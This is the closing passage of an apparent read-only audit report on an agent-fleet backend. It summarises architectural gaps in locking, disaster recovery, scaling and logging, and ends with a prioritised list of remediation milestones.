- Two genuinely built subsystems are currently inert: the RQ queue path and the event-bus pub/sub path — both have real, tested infrastructure with zero production callers. Decide whether to wire them in or remove them.
- Horizontal scaling requires real work before it's safe: leader election for 7 background loops, Redis-/DB-backed session/stream state instead of in-process dicts, explicit connection-pool sizing.
- Disaster recovery is currently a from-scratch project: no backups, no restore runbook, ephemeral `/tmp` workspace storage, no coordinated DB+filesystem snapshot strategy.
- No row-level locking anywhere in the codebase — a systemic gap (task transitions, heartbeats, memory dedup all show the same TOCTOU pattern independently).
- No structured/correlated logging despite the code's own documented design claim that trace_id ties everything together.
- Composite memory ranking silently defeats the HNSW index it's built on top of — will degrade as the system's own core design goal (shared fleet memory) is realized at scale.

## 7. Recommended Next Milestones

1. **Tool/policy consistency pass** (Blockers #1–#6) — highest severity, most contained fix surface; the correct pattern already exists elsewhere in the same files.
2. **Disaster recovery baseline** (Blocker #7, plus `/tmp` workspace durability) — backups + durable storage.
3. **Concurrency correctness** — row-level locking on task/agent-run transitions (appears independently in Sections 4.1, 4.4, 4.7).
4. **Decide RQ/event-bus fate** (Blocker #8, plus event-bus dead-subscriber gap) — wire in for real or remove; don't leave load-bearing-looking infrastructure inert.
5. **Horizontal-scaling readiness** — leader election, Redis-backed session state, explicit pool sizing — only once single-instance correctness is solid.
6. **Observability correctness** — structured/correlated logging, a real `/metrics` endpoint, split liveness/readiness.

---

*This report reflects a read-only audit performed 2026-08-05. No code was modified while producing it. All findings were traced to specific file/line references in the actual source; findings marked "Verified by execution" were additionally confirmed by running the real code against exploit inputs in the repository's own Python environment.*
